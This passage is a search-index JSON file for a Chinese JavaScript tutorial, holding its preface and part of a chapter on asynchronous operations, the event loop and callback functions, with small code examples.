{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"\u672c\u6559\u7a0b\u5168\u9762\u4ecb\u7ecd JavaScript \u6838\u5fc3\u8bed\u6cd5\uff0c\u8986\u76d6\u4e86 ES5 \u548c DOM \u89c4\u8303\u7684\u6240\u6709\u5185\u5bb9\u3002 \u5185\u5bb9\u4e0a\u4ece\u6700\u7b80\u5355\u7684\u8bb2\u8d77\uff0c\u5faa\u5e8f\u6e10\u8fdb\u3001\u7531\u6d45\u5165\u6df1\uff0c\u529b\u6c42\u6e05\u6670\u6613\u61c2\u3002\u6240\u6709\u7ae0\u8282\u90fd\u5e26\u6709\u5927\u91cf\u7684\u4ee3\u7801\u5b9e\u4f8b\uff0c\u4fbf\u4e8e\u7406\u89e3\u548c\u6a21\u4eff\uff0c\u53ef\u4ee5\u7528\u5230\u5b9e\u9645\u9879\u76ee\u4e2d\uff0c\u5373\u5b66\u5373\u7528\u3002 \u672c\u6559\u7a0b\u9002\u5408\u521d\u5b66\u8005\u5f53\u4f5c JavaScript \u8bed\u8a00\u5165\u95e8\u6559\u7a0b\uff0c\u5b66\u5b8c\u540e\u5c31\u53ef\u4ee5\u627f\u62c5\u5b9e\u9645\u7684\u7f51\u9875\u5f00\u53d1\u5de5\u4f5c\uff0c\u4e5f\u9002\u5408\u5f53\u4f5c\u65e5\u5e38\u4f7f\u7528\u7684\u53c2\u8003\u624b\u518c\u3002 JavaScript \u540e\u7eed\u65b0\u589e\u7684 ES6 \u8bed\u6cd5\uff0c\u8bf7\u770b \u300aES6 \u6807\u51c6\u5165\u95e8\u6559\u7a0b\u300b \u3002","title":"\u524d\u8a00"},{"location":"preface/","text":"\u524d\u8a00 \u00b6 \u6211\u5199\u8fd9\u672c\u6559\u7a0b\uff0c\u4e3b\u8981\u539f\u56e0\u662f\u81ea\u5df1\u9700\u8981\u3002 \u7f16\u7a0b\u65f6\uff0c\u5f80\u5f80\u9700\u8981\u67e5\u9605\u8d44\u6599\uff0c\u786e\u5b9a\u51c6\u786e\u7528\u6cd5\u3002\u7406\u60f3\u7684 JavaScript \u53c2\u8003\u4e66\uff0c\u5e94\u8be5\u7b80\u660e\u6613\u61c2\uff0c\u4e00\u76ee\u4e86\u7136\uff0c\u544a\u8bc9\u6211\u6709\u54ea\u4e9b\u6ce8\u610f\u70b9\uff0c\u63d0\u4f9b\u4ee3\u7801\u8303\u4f8b\u3002\u5982\u679c\u6d89\u53ca\u91cd\u8981\u6982\u5ff5\uff0c\u8fd8\u5e94\u8be5\u9002\u5f53\u8bb2\u89e3\u3002\u53ef\u662f\u5927\u591a\u6570\u65f6\u5019\uff0c\u73b0\u5b9e\u90fd\u4e0d\u662f\u5982\u6b64\u3002\u627e\u5230\u7684\u8d44\u6599\u5197\u957f\u96be\u61c2\uff0c\u6293\u4e0d\u4f4f\u91cd\u70b9\uff0c\u6709\u65f6\u8fd8\u5f88\u9648\u65e7\uff0c\u8ddf\u4e0d\u4e0a\u8bed\u8a00\u6807\u51c6\u548c\u6d4f\u89c8\u5668\u7684\u5feb\u901f\u53d1\u5c55\uff0c\u4e14\u5927\u591a\u6570\u662f\u82f1\u6587\u8d44\u6599\u3002 \u5b66\u4e60\u8fc7\u7a0b\u4e2d\uff0c\u6211\u505a\u4e86\u5f88\u591a JavaScript \u7b14\u8bb0\u3002\u591a\u5e74\u7d2f\u79ef\uff0c\u6570\u91cf\u76f8\u5f53\u5e9e\u5927\u3002\u9047\u5230\u95ee\u9898\uff0c\u6211\u9996\u5148\u67e5\u81ea\u5df1\u7684\u7b14\u8bb0\uff0c\u5982\u679c\u7b14\u8bb0\u91cc\u6ca1\u6709\uff0c\u518d\u5230\u7f51\u4e0a\u67e5\uff0c\u6700\u540e\u56de\u8fc7\u5934\u628a\u7b14\u8bb0\u8865\u5168\u3002\u7ec8\u4e8e\u6709\u4e00\u5929\uff0c\u6211\u610f\u8bc6\u5230\u53ef\u4ee5\u628a\u7b14\u8bb0\u505a\u6210\u4e66\uff0c\u8fd9\u5c31\u662f\u8fd9\u672c\u4e66\u7684\u7531\u6765\u3002 \u6b63\u56e0\u4e3a\u8131\u80ce\u4e8e\u7b14\u8bb0\uff0c\u8fd9\u672c\u6559\u7a0b\u8ddf\u5176\u4ed6 JavaScript \u4e66\u7c4d\u6709\u6240\u4e0d\u540c\u3002\u4f5c\u4e3a\u6559\u7a0b\uff0c\u672c\u4e66\u5bf9\u6240\u6709\u91cd\u8981\u6982\u5ff5\u90fd\u8fdb\u884c\u4e86\u8bb2\u89e3\uff0c\u52aa\u529b\u628a\u590d\u6742\u7684\u95ee\u9898\u8bb2\u5f97\u7b80\u5355\uff0c\u5e0c\u671b\u4e00\u4e24\u5206\u949f\u5185\u5c31\u80fd\u6293\u4f4f\u91cd\u70b9\u3002\u672c\u4e66\u8fd8\u53ef\u4ee5\u4f5c\u4e3a\u53c2\u8003\u624b\u518c\uff0c\u7f57\u5217\u4e86\u4e3b\u8981\u7528\u6cd5\u548c\u5404\u79cd API \u63a5\u53e3\uff0c\u5e76\u7ed9\u51fa\u53ef\u4ee5\u7acb\u5373\u8fd0\u884c\u7684\u4ee3\u7801\u3002\u6240\u6709\u7ae0\u8282\u6309\u7167\u8bed\u8a00\u7684 API \u7f16\u6392\uff0c\u65b9\u4fbf\u4ee5\u540e\u7684\u67e5\u9605\u3002 \u5982\u679c\u4f60\u53d1\u73b0\u67d0\u5904\u51fa\u73b0\u964c\u751f\u7684\u65b0\u6982\u5ff5\uff0c\u8bf7\u4e0d\u8981\u62c5\u5fc3\uff0c\u53ef\u4ee5\u7ee7\u7eed\u9605\u8bfb\u4e0b\u53bb\u3002\u4ee5\u540e\u67e5\u9605\u8fd9\u4e9b\u7ae0\u8282\u7684\u65f6\u5019\uff0c\u4f60\u4f1a\u53d1\u73b0\u5f88\u65b9\u4fbf\u627e\u5230\u67d0\u4e2a\u77e5\u8bc6\u70b9\u76f8\u5173\u7684\u6240\u6709\u5185\u5bb9\u3002","title":"\u524d\u8a00"},{"location":"preface/#_1","text":"\u6211\u5199\u8fd9\u672c\u6559\u7a0b\uff0c\u4e3b\u8981\u539f\u56e0\u662f\u81ea\u5df1\u9700\u8981\u3002 \u7f16\u7a0b\u65f6\uff0c\u5f80\u5f80\u9700\u8981\u67e5\u9605\u8d44\u6599\uff0c\u786e\u5b9a\u51c6\u786e\u7528\u6cd5\u3002\u7406\u60f3\u7684 JavaScript \u53c2\u8003\u4e66\uff0c\u5e94\u8be5\u7b80\u660e\u6613\u61c2\uff0c\u4e00\u76ee\u4e86\u7136\uff0c\u544a\u8bc9\u6211\u6709\u54ea\u4e9b\u6ce8\u610f\u70b9\uff0c\u63d0\u4f9b\u4ee3\u7801\u8303\u4f8b\u3002\u5982\u679c\u6d89\u53ca\u91cd\u8981\u6982\u5ff5\uff0c\u8fd8\u5e94\u8be5\u9002\u5f53\u8bb2\u89e3\u3002\u53ef\u662f\u5927\u591a\u6570\u65f6\u5019\uff0c\u73b0\u5b9e\u90fd\u4e0d\u662f\u5982\u6b64\u3002\u627e\u5230\u7684\u8d44\u6599\u5197\u957f\u96be\u61c2\uff0c\u6293\u4e0d\u4f4f\u91cd\u70b9\uff0c\u6709\u65f6\u8fd8\u5f88\u9648\u65e7\uff0c\u8ddf\u4e0d\u4e0a\u8bed\u8a00\u6807\u51c6\u548c\u6d4f\u89c8\u5668\u7684\u5feb\u901f\u53d1\u5c55\uff0c\u4e14\u5927\u591a\u6570\u662f\u82f1\u6587\u8d44\u6599\u3002 \u5b66\u4e60\u8fc7\u7a0b\u4e2d\uff0c\u6211\u505a\u4e86\u5f88\u591a JavaScript \u7b14\u8bb0\u3002\u591a\u5e74\u7d2f\u79ef\uff0c\u6570\u91cf\u76f8\u5f53\u5e9e\u5927\u3002\u9047\u5230\u95ee\u9898\uff0c\u6211\u9996\u5148\u67e5\u81ea\u5df1\u7684\u7b14\u8bb0\uff0c\u5982\u679c\u7b14\u8bb0\u91cc\u6ca1\u6709\uff0c\u518d\u5230\u7f51\u4e0a\u67e5\uff0c\u6700\u540e\u56de\u8fc7\u5934\u628a\u7b14\u8bb0\u8865\u5168\u3002\u7ec8\u4e8e\u6709\u4e00\u5929\uff0c\u6211\u610f\u8bc6\u5230\u53ef\u4ee5\u628a\u7b14\u8bb0\u505a\u6210\u4e66\uff0c\u8fd9\u5c31\u662f\u8fd9\u672c\u4e66\u7684\u7531\u6765\u3002 \u6b63\u56e0\u4e3a\u8131\u80ce\u4e8e\u7b14\u8bb0\uff0c\u8fd9\u672c\u6559\u7a0b\u8ddf\u5176\u4ed6 JavaScript \u4e66\u7c4d\u6709\u6240\u4e0d\u540c\u3002\u4f5c\u4e3a\u6559\u7a0b\uff0c\u672c\u4e66\u5bf9\u6240\u6709\u91cd\u8981\u6982\u5ff5\u90fd\u8fdb\u884c\u4e86\u8bb2\u89e3\uff0c\u52aa\u529b\u628a\u590d\u6742\u7684\u95ee\u9898\u8bb2\u5f97\u7b80\u5355\uff0c\u5e0c\u671b\u4e00\u4e24\u5206\u949f\u5185\u5c31\u80fd\u6293\u4f4f\u91cd\u70b9\u3002\u672c\u4e66\u8fd8\u53ef\u4ee5\u4f5c\u4e3a\u53c2\u8003\u624b\u518c\uff0c\u7f57\u5217\u4e86\u4e3b\u8981\u7528\u6cd5\u548c\u5404\u79cd API \u63a5\u53e3\uff0c\u5e76\u7ed9\u51fa\u53ef\u4ee5\u7acb\u5373\u8fd0\u884c\u7684\u4ee3\u7801\u3002\u6240\u6709\u7ae0\u8282\u6309\u7167\u8bed\u8a00\u7684 API \u7f16\u6392\uff0c\u65b9\u4fbf\u4ee5\u540e\u7684\u67e5\u9605\u3002 \u5982\u679c\u4f60\u53d1\u73b0\u67d0\u5904\u51fa\u73b0\u964c\u751f\u7684\u65b0\u6982\u5ff5\uff0c\u8bf7\u4e0d\u8981\u62c5\u5fc3\uff0c\u53ef\u4ee5\u7ee7\u7eed\u9605\u8bfb\u4e0b\u53bb\u3002\u4ee5\u540e\u67e5\u9605\u8fd9\u4e9b\u7ae0\u8282\u7684\u65f6\u5019\uff0c\u4f60\u4f1a\u53d1\u73b0\u5f88\u65b9\u4fbf\u627e\u5230\u67d0\u4e2a\u77e5\u8bc6\u70b9\u76f8\u5173\u7684\u6240\u6709\u5185\u5bb9\u3002","title":"\u524d\u8a00"},{"location":"async/general/","text":"\u5f02\u6b65\u64cd\u4f5c\u6982\u8ff0 \u00b6 \u5355\u7ebf\u7a0b\u6a21\u578b \u00b6 \u5355\u7ebf\u7a0b\u6a21\u578b\u6307\u7684\u662f\uff0cJavaScript \u53ea\u5728\u4e00\u4e2a\u7ebf\u7a0b\u4e0a\u8fd0\u884c\u3002\u4e5f\u5c31\u662f\u8bf4\uff0cJavaScript \u540c\u65f6\u53ea\u80fd\u6267\u884c\u4e00\u4e2a\u4efb\u52a1\uff0c\u5176\u4ed6\u4efb\u52a1\u90fd\u5fc5\u987b\u5728\u540e\u9762\u6392\u961f\u7b49\u5f85\u3002 \u6ce8\u610f\uff0cJavaScript \u53ea\u5728\u4e00\u4e2a\u7ebf\u7a0b\u4e0a\u8fd0\u884c\uff0c\u4e0d\u4ee3\u8868 JavaScript \u5f15\u64ce\u53ea\u6709\u4e00\u4e2a\u7ebf\u7a0b\u3002\u4e8b\u5b9e\u4e0a\uff0cJavaScript \u5f15\u64ce\u6709\u591a\u4e2a\u7ebf\u7a0b\uff0c\u5355\u4e2a\u811a\u672c\u53ea\u80fd\u5728\u4e00\u4e2a\u7ebf\u7a0b\u4e0a\u8fd0\u884c\uff08\u79f0\u4e3a\u4e3b\u7ebf\u7a0b\uff09\uff0c\u5176\u4ed6\u7ebf\u7a0b\u90fd\u662f\u5728\u540e\u53f0\u914d\u5408\u3002 JavaScript \u4e4b\u6240\u4ee5\u91c7\u7528\u5355\u7ebf\u7a0b\uff0c\u800c\u4e0d\u662f\u591a\u7ebf\u7a0b\uff0c\u8ddf\u5386\u53f2\u6709\u5173\u7cfb\u3002JavaScript \u4ece\u8bde\u751f\u8d77\u5c31\u662f\u5355\u7ebf\u7a0b\uff0c\u539f\u56e0\u662f\u4e0d\u60f3\u8ba9\u6d4f\u89c8\u5668\u53d8\u5f97\u592a\u590d\u6742\uff0c\u56e0\u4e3a\u591a\u7ebf\u7a0b\u9700\u8981\u5171\u4eab\u8d44\u6e90\u3001\u4e14\u6709\u53ef\u80fd\u4fee\u6539\u5f7c\u6b64\u7684\u8fd0\u884c\u7ed3\u679c\uff0c\u5bf9\u4e8e\u4e00\u79cd\u7f51\u9875\u811a\u672c\u8bed\u8a00\u6765\u8bf4\uff0c\u8fd9\u5c31\u592a\u590d\u6742\u4e86\u3002\u5982\u679c JavaScript \u540c\u65f6\u6709\u4e24\u4e2a\u7ebf\u7a0b\uff0c\u4e00\u4e2a\u7ebf\u7a0b\u5728\u7f51\u9875 DOM \u8282\u70b9\u4e0a\u6dfb\u52a0\u5185\u5bb9\uff0c\u53e6\u4e00\u4e2a\u7ebf\u7a0b\u5220\u9664\u4e86\u8fd9\u4e2a\u8282\u70b9\uff0c\u8fd9\u65f6\u6d4f\u89c8\u5668\u5e94\u8be5\u4ee5\u54ea\u4e2a\u7ebf\u7a0b\u4e3a\u51c6\uff1f\u662f\u4e0d\u662f\u8fd8\u8981\u6709\u9501\u673a\u5236\uff1f\u6240\u4ee5\uff0c\u4e3a\u4e86\u907f\u514d\u590d\u6742\u6027\uff0cJavaScript \u4e00\u5f00\u59cb\u5c31\u662f\u5355\u7ebf\u7a0b\uff0c\u8fd9\u5df2\u7ecf\u6210\u4e86\u8fd9\u95e8\u8bed\u8a00\u7684\u6838\u5fc3\u7279\u5f81\uff0c\u5c06\u6765\u4e5f\u4e0d\u4f1a\u6539\u53d8\u3002 \u8fd9\u79cd\u6a21\u5f0f\u7684\u597d\u5904\u662f\u5b9e\u73b0\u8d77\u6765\u6bd4\u8f83\u7b80\u5355\uff0c\u6267\u884c\u73af\u5883\u76f8\u5bf9\u5355\u7eaf\uff1b\u574f\u5904\u662f\u53ea\u8981\u6709\u4e00\u4e2a\u4efb\u52a1\u8017\u65f6\u5f88\u957f\uff0c\u540e\u9762\u7684\u4efb\u52a1\u90fd\u5fc5\u987b\u6392\u961f\u7b49\u7740\uff0c\u4f1a\u62d6\u5ef6\u6574\u4e2a\u7a0b\u5e8f\u7684\u6267\u884c\u3002\u5e38\u89c1\u7684\u6d4f\u89c8\u5668\u65e0\u54cd\u5e94\uff08\u5047\u6b7b\uff09\uff0c\u5f80\u5f80\u5c31\u662f\u56e0\u4e3a\u67d0\u4e00\u6bb5 JavaScript \u4ee3\u7801\u957f\u65f6\u95f4\u8fd0\u884c\uff08\u6bd4\u5982\u6b7b\u5faa\u73af\uff09\uff0c\u5bfc\u81f4\u6574\u4e2a\u9875\u9762\u5361\u5728\u8fd9\u4e2a\u5730\u65b9\uff0c\u5176\u4ed6\u4efb\u52a1\u65e0\u6cd5\u6267\u884c\u3002JavaScript \u8bed\u8a00\u672c\u8eab\u5e76\u4e0d\u6162\uff0c\u6162\u7684\u662f\u8bfb\u5199\u5916\u90e8\u6570\u636e\uff0c\u6bd4\u5982\u7b49\u5f85 Ajax \u8bf7\u6c42\u8fd4\u56de\u7ed3\u679c\u3002\u8fd9\u4e2a\u65f6\u5019\uff0c\u5982\u679c\u5bf9\u65b9\u670d\u52a1\u5668\u8fdf\u8fdf\u6ca1\u6709\u54cd\u5e94\uff0c\u6216\u8005\u7f51\u7edc\u4e0d\u901a\u7545\uff0c\u5c31\u4f1a\u5bfc\u81f4\u811a\u672c\u7684\u957f\u65f6\u95f4\u505c\u6ede\u3002 \u5982\u679c\u6392\u961f\u662f\u56e0\u4e3a\u8ba1\u7b97\u91cf\u5927\uff0cCPU \u5fd9\u4e0d\u8fc7\u6765\uff0c\u5012\u4e5f\u7b97\u4e86\uff0c\u4f46\u662f\u5f88\u591a\u65f6\u5019 CPU \u662f\u95f2\u7740\u7684\uff0c\u56e0\u4e3a IO \u64cd\u4f5c\uff08\u8f93\u5165\u8f93\u51fa\uff09\u5f88\u6162\uff08\u6bd4\u5982 Ajax \u64cd\u4f5c\u4ece\u7f51\u7edc\u8bfb\u53d6\u6570\u636e\uff09\uff0c\u4e0d\u5f97\u4e0d\u7b49\u7740\u7ed3\u679c\u51fa\u6765\uff0c\u518d\u5f80\u4e0b\u6267\u884c\u3002JavaScript \u8bed\u8a00\u7684\u8bbe\u8ba1\u8005\u610f\u8bc6\u5230\uff0c\u8fd9\u65f6 CPU \u5b8c\u5168\u53ef\u4ee5\u4e0d\u7ba1 IO \u64cd\u4f5c\uff0c\u6302\u8d77\u5904\u4e8e\u7b49\u5f85\u4e2d\u7684\u4efb\u52a1\uff0c\u5148\u8fd0\u884c\u6392\u5728\u540e\u9762\u7684\u4efb\u52a1\u3002\u7b49\u5230 IO \u64cd\u4f5c\u8fd4\u56de\u4e86\u7ed3\u679c\uff0c\u518d\u56de\u8fc7\u5934\uff0c\u628a\u6302\u8d77\u7684\u4efb\u52a1\u7ee7\u7eed\u6267\u884c\u4e0b\u53bb\u3002\u8fd9\u79cd\u673a\u5236\u5c31\u662f JavaScript \u5185\u90e8\u91c7\u7528\u7684\u201c\u4e8b\u4ef6\u5faa\u73af\u201d\u673a\u5236\uff08Event Loop\uff09\u3002 \u5355\u7ebf\u7a0b\u6a21\u578b\u867d\u7136\u5bf9 JavaScript \u6784\u6210\u4e86\u5f88\u5927\u7684\u9650\u5236\uff0c\u4f46\u4e5f\u56e0\u6b64\u4f7f\u5b83\u5177\u5907\u4e86\u5176\u4ed6\u8bed\u8a00\u4e0d\u5177\u5907\u7684\u4f18\u52bf\u3002\u5982\u679c\u7528\u5f97\u597d\uff0cJavaScript \u7a0b\u5e8f\u662f\u4e0d\u4f1a\u51fa\u73b0\u5835\u585e\u7684\uff0c\u8fd9\u5c31\u662f Node.js \u53ef\u4ee5\u7528\u5f88\u5c11\u7684\u8d44\u6e90\uff0c\u5e94\u4ed8\u5927\u6d41\u91cf\u8bbf\u95ee\u7684\u539f\u56e0\u3002 \u4e3a\u4e86\u5229\u7528\u591a\u6838 CPU \u7684\u8ba1\u7b97\u80fd\u529b\uff0cHTML5 \u63d0\u51fa Web Worker \u6807\u51c6\uff0c\u5141\u8bb8 JavaScript \u811a\u672c\u521b\u5efa\u591a\u4e2a\u7ebf\u7a0b\uff0c\u4f46\u662f\u5b50\u7ebf\u7a0b\u5b8c\u5168\u53d7\u4e3b\u7ebf\u7a0b\u63a7\u5236\uff0c\u4e14\u4e0d\u5f97\u64cd\u4f5c DOM\u3002\u6240\u4ee5\uff0c\u8fd9\u4e2a\u65b0\u6807\u51c6\u5e76\u6ca1\u6709\u6539\u53d8 JavaScript \u5355\u7ebf\u7a0b\u7684\u672c\u8d28\u3002 \u540c\u6b65\u4efb\u52a1\u548c\u5f02\u6b65\u4efb\u52a1 \u00b6 \u7a0b\u5e8f\u91cc\u9762\u6240\u6709\u7684\u4efb\u52a1\uff0c\u53ef\u4ee5\u5206\u6210\u4e24\u7c7b\uff1a\u540c\u6b65\u4efb\u52a1\uff08synchronous\uff09\u548c\u5f02\u6b65\u4efb\u52a1\uff08asynchronous\uff09\u3002 \u540c\u6b65\u4efb\u52a1\u662f\u90a3\u4e9b\u6ca1\u6709\u88ab\u5f15\u64ce\u6302\u8d77\u3001\u5728\u4e3b\u7ebf\u7a0b\u4e0a\u6392\u961f\u6267\u884c\u7684\u4efb\u52a1\u3002\u53ea\u6709\u524d\u4e00\u4e2a\u4efb\u52a1\u6267\u884c\u5b8c\u6bd5\uff0c\u624d\u80fd\u6267\u884c\u540e\u4e00\u4e2a\u4efb\u52a1\u3002 \u5f02\u6b65\u4efb\u52a1\u662f\u90a3\u4e9b\u88ab\u5f15\u64ce\u653e\u5728\u4e00\u8fb9\uff0c\u4e0d\u8fdb\u5165\u4e3b\u7ebf\u7a0b\u3001\u800c\u8fdb\u5165\u4efb\u52a1\u961f\u5217\u7684\u4efb\u52a1\u3002\u53ea\u6709\u5f15\u64ce\u8ba4\u4e3a\u67d0\u4e2a\u5f02\u6b65\u4efb\u52a1\u53ef\u4ee5\u6267\u884c\u4e86\uff08\u6bd4\u5982 Ajax \u64cd\u4f5c\u4ece\u670d\u52a1\u5668\u5f97\u5230\u4e86\u7ed3\u679c\uff09\uff0c\u8be5\u4efb\u52a1\uff08\u91c7\u7528\u56de\u8c03\u51fd\u6570\u7684\u5f62\u5f0f\uff09\u624d\u4f1a\u8fdb\u5165\u4e3b\u7ebf\u7a0b\u6267\u884c\u3002\u6392\u5728\u5f02\u6b65\u4efb\u52a1\u540e\u9762\u7684\u4ee3\u7801\uff0c\u4e0d\u7528\u7b49\u5f85\u5f02\u6b65\u4efb\u52a1\u7ed3\u675f\u4f1a\u9a6c\u4e0a\u8fd0\u884c\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u5f02\u6b65\u4efb\u52a1\u4e0d\u5177\u6709\u201c\u5835\u585e\u201d\u6548\u5e94\u3002 \u4e3e\u4f8b\u6765\u8bf4\uff0cAjax \u64cd\u4f5c\u53ef\u4ee5\u5f53\u4f5c\u540c\u6b65\u4efb\u52a1\u5904\u7406\uff0c\u4e5f\u53ef\u4ee5\u5f53\u4f5c\u5f02\u6b65\u4efb\u52a1\u5904\u7406\uff0c\u7531\u5f00\u53d1\u8005\u51b3\u5b9a\u3002\u5982\u679c\u662f\u540c\u6b65\u4efb\u52a1\uff0c\u4e3b\u7ebf\u7a0b\u5c31\u7b49\u7740 Ajax \u64cd\u4f5c\u8fd4\u56de\u7ed3\u679c\uff0c\u518d\u5f80\u4e0b\u6267\u884c\uff1b\u5982\u679c\u662f\u5f02\u6b65\u4efb\u52a1\uff0c\u4e3b\u7ebf\u7a0b\u5728\u53d1\u51fa Ajax \u8bf7\u6c42\u4ee5\u540e\uff0c\u5c31\u76f4\u63a5\u5f80\u4e0b\u6267\u884c\uff0c\u7b49\u5230 Ajax \u64cd\u4f5c\u6709\u4e86\u7ed3\u679c\uff0c\u4e3b\u7ebf\u7a0b\u518d\u6267\u884c\u5bf9\u5e94\u7684\u56de\u8c03\u51fd\u6570\u3002 \u4efb\u52a1\u961f\u5217\u548c\u4e8b\u4ef6\u5faa\u73af \u00b6 JavaScript \u8fd0\u884c\u65f6\uff0c\u9664\u4e86\u4e00\u4e2a\u6b63\u5728\u8fd0\u884c\u7684\u4e3b\u7ebf\u7a0b\uff0c\u5f15\u64ce\u8fd8\u63d0\u4f9b\u4e00\u4e2a\u4efb\u52a1\u961f\u5217\uff08task queue\uff09\uff0c\u91cc\u9762\u662f\u5404\u79cd\u9700\u8981\u5f53\u524d\u7a0b\u5e8f\u5904\u7406\u7684\u5f02\u6b65\u4efb\u52a1\u3002\uff08\u5b9e\u9645\u4e0a\uff0c\u6839\u636e\u5f02\u6b65\u4efb\u52a1\u7684\u7c7b\u578b\uff0c\u5b58\u5728\u591a\u4e2a\u4efb\u52a1\u961f\u5217\u3002\u4e3a\u4e86\u65b9\u4fbf\u7406\u89e3\uff0c\u8fd9\u91cc\u5047\u8bbe\u53ea\u5b58\u5728\u4e00\u4e2a\u961f\u5217\u3002\uff09 \u9996\u5148\uff0c\u4e3b\u7ebf\u7a0b\u4f1a\u53bb\u6267\u884c\u6240\u6709\u7684\u540c\u6b65\u4efb\u52a1\u3002\u7b49\u5230\u540c\u6b65\u4efb\u52a1\u5168\u90e8\u6267\u884c\u5b8c\uff0c\u5c31\u4f1a\u53bb\u770b\u4efb\u52a1\u961f\u5217\u91cc\u9762\u7684\u5f02\u6b65\u4efb\u52a1\u3002\u5982\u679c\u6ee1\u8db3\u6761\u4ef6\uff0c\u90a3\u4e48\u5f02\u6b65\u4efb\u52a1\u5c31\u91cd\u65b0\u8fdb\u5165\u4e3b\u7ebf\u7a0b\u5f00\u59cb\u6267\u884c\uff0c\u8fd9\u65f6\u5b83\u5c31\u53d8\u6210\u540c\u6b65\u4efb\u52a1\u4e86\u3002\u7b49\u5230\u6267\u884c\u5b8c\uff0c\u4e0b\u4e00\u4e2a\u5f02\u6b65\u4efb\u52a1\u518d\u8fdb\u5165\u4e3b\u7ebf\u7a0b\u5f00\u59cb\u6267\u884c\u3002\u4e00\u65e6\u4efb\u52a1\u961f\u5217\u6e05\u7a7a\uff0c\u7a0b\u5e8f\u5c31\u7ed3\u675f\u6267\u884c\u3002 \u5f02\u6b65\u4efb\u52a1\u7684\u5199\u6cd5\u901a\u5e38\u662f\u56de\u8c03\u51fd\u6570\u3002\u4e00\u65e6\u5f02\u6b65\u4efb\u52a1\u91cd\u65b0\u8fdb\u5165\u4e3b\u7ebf\u7a0b\uff0c\u5c31\u4f1a\u6267\u884c\u5bf9\u5e94\u7684\u56de\u8c03\u51fd\u6570\u3002\u5982\u679c\u4e00\u4e2a\u5f02\u6b65\u4efb\u52a1\u6ca1\u6709\u56de\u8c03\u51fd\u6570\uff0c\u5c31\u4e0d\u4f1a\u8fdb\u5165\u4efb\u52a1\u961f\u5217\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u4e0d\u4f1a\u91cd\u65b0\u8fdb\u5165\u4e3b\u7ebf\u7a0b\uff0c\u56e0\u4e3a\u6ca1\u6709\u7528\u56de\u8c03\u51fd\u6570\u6307\u5b9a\u4e0b\u4e00\u6b65\u7684\u64cd\u4f5c\u3002 JavaScript \u5f15\u64ce\u600e\u4e48\u77e5\u9053\u5f02\u6b65\u4efb\u52a1\u6709\u6ca1\u6709\u7ed3\u679c\uff0c\u80fd\u4e0d\u80fd\u8fdb\u5165\u4e3b\u7ebf\u7a0b\u5462\uff1f\u7b54\u6848\u5c31\u662f\u5f15\u64ce\u5728\u4e0d\u505c\u5730\u68c0\u67e5\uff0c\u4e00\u904d\u53c8\u4e00\u904d\uff0c\u53ea\u8981\u540c\u6b65\u4efb\u52a1\u6267\u884c\u5b8c\u4e86\uff0c\u5f15\u64ce\u5c31\u4f1a\u53bb\u68c0\u67e5\u90a3\u4e9b\u6302\u8d77\u6765\u7684\u5f02\u6b65\u4efb\u52a1\uff0c\u662f\u4e0d\u662f\u53ef\u4ee5\u8fdb\u5165\u4e3b\u7ebf\u7a0b\u4e86\u3002\u8fd9\u79cd\u5faa\u73af\u68c0\u67e5\u7684\u673a\u5236\uff0c\u5c31\u53eb\u505a\u4e8b\u4ef6\u5faa\u73af\uff08Event Loop\uff09\u3002 \u7ef4\u57fa\u767e\u79d1 \u7684\u5b9a\u4e49\u662f\uff1a\u201c\u4e8b\u4ef6\u5faa\u73af\u662f\u4e00\u4e2a\u7a0b\u5e8f\u7ed3\u6784\uff0c\u7528\u4e8e\u7b49\u5f85\u548c\u53d1\u9001\u6d88\u606f\u548c\u4e8b\u4ef6\uff08a programming construct that waits for and dispatches events or messages in a program\uff09\u201d\u3002 \u5f02\u6b65\u64cd\u4f5c\u7684\u6a21\u5f0f \u00b6 \u4e0b\u9762\u603b\u7ed3\u4e00\u4e0b\u5f02\u6b65\u64cd\u4f5c\u7684\u51e0\u79cd\u6a21\u5f0f\u3002 \u56de\u8c03\u51fd\u6570 \u00b6 \u56de\u8c03\u51fd\u6570\u662f\u5f02\u6b65\u64cd\u4f5c\u6700\u57fa\u672c\u7684\u65b9\u6cd5\u3002 \u4e0b\u9762\u662f\u4e24\u4e2a\u51fd\u6570 f1 \u548c f2 \uff0c\u7f16\u7a0b\u7684\u610f\u56fe\u662f f2 \u5fc5\u987b\u7b49\u5230 f1 \u6267\u884c\u5b8c\u6210\uff0c\u624d\u80fd\u6267\u884c\u3002 1 2 3 4 5 6 7 8 9 10 function f1 () { // ... } function f2 () { // ... } f1 (); f2 (); \u4e0a\u9762\u4ee3\u7801\u7684\u95ee\u9898\u5728\u4e8e\uff0c\u5982\u679c f1 \u662f\u5f02\u6b65\u64cd\u4f5c\uff0c f2 \u4f1a\u7acb\u5373\u6267\u884c\uff0c\u4e0d\u4f1a\u7b49\u5230 f1 \u7ed3\u675f\u518d\u6267\u884c\u3002 \u8fd9\u65f6\uff0c\u53ef\u4ee5\u8003\u8651\u6539\u5199 f1 \uff0c\u628a f2 \u5199\u6210 f1 \u7684\u56de\u8c03\u51fd\u6570\u3002 1 2 3 4 5 6 7 8 9 10 function f1 ( callback ) { // ... callback (); } function f2 () { // ... } f1 ( f2 ); \u56de\u8c03\u51fd\u6570\u7684\u4f18\u70b9\u662f\u7b80\u5355\u3001\u5bb9\u6613\u7406\u89e3\u548c\u5b9e\u73b0\uff0c\u7f3a\u70b9\u662f\u4e0d\u5229\u4e8e\u4ee3\u7801\u7684\u9605\u8bfb\u548c\u7ef4\u62a4\uff0c\u5404\u4e2a\u90e8\u5206\u4e4b\u95f4\u9ad8\u5ea6 \u8026\u5408 \uff08coupling\uff09\uff0c\u4f7f\u5f97\u7a0b\u5e8f\u7ed3\u6784\u6df7\u4e71\u3001\u6d41\u7a0b\u96be\u4ee5\u8ffd\u8e2a\uff08\u5c24\u5176\u662f\u591a\u4e2a\u56de\u8c03\u51fd\u6570\u5d4c\u5957\u7684\u60c5\u51b5\uff09\uff0c\u800c\u4e14\u6bcf\u4e2a\u4efb\u52a1\u53ea\u80fd\u6307\u5b9a\u4e00\u4e2a\u56de\u8c03\u51fd\u6570\u3002 \u4e8b\u4ef6\u76d1\u542c \u00b6 